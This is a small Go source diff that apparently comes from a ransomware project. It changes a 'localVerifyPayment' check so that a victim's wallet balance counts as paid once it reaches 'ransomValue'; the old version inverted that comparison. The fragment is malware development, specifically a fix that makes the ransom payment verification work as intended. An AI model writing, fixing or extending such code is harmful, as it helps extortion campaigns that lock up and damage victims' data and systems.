@@ -127,7 +127,7 @@ func (s *Scheme) localVerifyPayment(pubkey string) bool {
     if !ok {
         return false
     }
-    return balance < ransomValue
+    return balance >= ransomValue
 }
 
 func (s *Scheme) checkBalance(wallet string) (float64, bool) {
